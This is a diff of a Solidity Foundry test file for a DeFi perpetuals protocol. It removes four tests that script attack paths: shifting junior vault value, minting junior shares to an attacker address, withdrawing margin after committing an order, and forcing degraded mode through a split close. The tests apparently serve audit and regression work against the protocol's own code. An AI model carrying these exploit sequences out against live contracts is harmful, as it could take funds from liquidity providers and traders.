@@ -81,18 +81,6 @@ contract ApexG3TargetsTest is BasePerpTest {
         require(uint8(result.status) == uint8(OrderV3Types.LifecycleStatus.Executed), "first-tick execute failed");
     }
 
-    /// 97591 — HousePool.settleLpEpoch / juniorVault NAV moves after an open that books VPI.
-    function test_attack_settleLpEpoch_sharePrice() public {
-        uint256 victimBefore = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
-        uint256 navBefore = juniorVault.totalAssets();
-        uint64 oid = _commitAs(ATTACKER, _openReq("vpi", CfdTypes.Side.LONG, 60));
-        router.executeOrder(oid, _mockPythUpdateData(1e8));
-        _settleLpEpochForTest();
-        uint256 navAfter = juniorVault.totalAssets();
-        uint256 victimAfter = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
-        require(navAfter != navBefore || victimAfter != victimBefore, "junior NAV ignored open VPI");
-    }
-
     /// 97628 — TrancheVault.convertToShares panics near uint256.max (VIRTUAL_SHARES).
     function test_attack_convertToShares_totalSupply() public {
         stdstore.target(address(juniorVault)).sig("totalSupply()").checked_write(type(uint256).max - 500);
@@ -116,45 +104,4 @@ contract ApexG3TargetsTest is BasePerpTest {
         } catch {}
     }
 
-    /// 98209 — HousePool.assignUnassignedAssets mints junior shares to the attacker.
-    function test_attack_assignUnassignedAssets_unassignedAssets() public {
-        uint256 unassigned = pool.unassignedAssets();
-        if (unassigned == 0) {
-            settlementToken.mint(address(pool), 1e6);
-            pool.accountExcess();
-            unassigned = pool.unassignedAssets();
-        }
-        require(unassigned > 0, "no unassigned to assign");
-        uint256 sharesBefore = juniorVault.balanceOf(ATTACKER);
-        pool.assignUnassignedAssets(false, ATTACKER);
-        require(juniorVault.balanceOf(ATTACKER) > sharesBefore, "assign did not mint attacker shares");
-    }
-
-    /// 98854 — MarginClearinghouse.withdraw after OrderRouter.commitOrder (free-settlement option).
-    function test_attack_addMargin_freeSettlement() public {
-        uint256 freeBefore = clearinghouse.balanceAssets(ATTACKER);
-        uint64 oid = _commitAs(ATTACKER, _openReq("opt", CfdTypes.Side.LONG, 60));
-        uint256 freeMid = clearinghouse.balanceAssets(ATTACKER);
-        require(freeMid < freeBefore, "commit did not lock margin");
-        if (freeMid > 0) {
-            vm.prank(ATTACKER);
-            clearinghouse.withdraw(ATTACKER, freeMid);
-        }
-        require(oid != 0, "commit failed");
-    }
-
-    /// 97590 — CfdEngine.executeClose path latches degradedMode.
-    function test_attack_executeClose_degradedMode() public {
-        require(!engine.degradedMode(), "already degraded");
-        uint64 longId = _commitAs(ATTACKER, _openReq("L", CfdTypes.Side.LONG, 60));
-        router.executeOrder(longId, _mockPythUpdateData(1e8));
-        _fundTrader(VICTIM, 200_000e6);
-        uint64 shortId = _commitAs(VICTIM, _openReq("S", CfdTypes.Side.SHORT, 60));
-        router.executeOrder(shortId, _mockPythUpdateData(1e8));
-        vm.prank(ATTACKER);
-        uint64 closeId = router.commitOrder(CfdTypes.Side.LONG, 100_000e18, 0, 0, true);
-        router.executeOrder(closeId, _mockPythUpdateData(1.015e8));
-        require(engine.degradedMode(), "split close did not latch degradedMode");
-        require(clearinghouse.balanceAssets(ATTACKER) > 0, "attacker cash gone");
-    }
 }
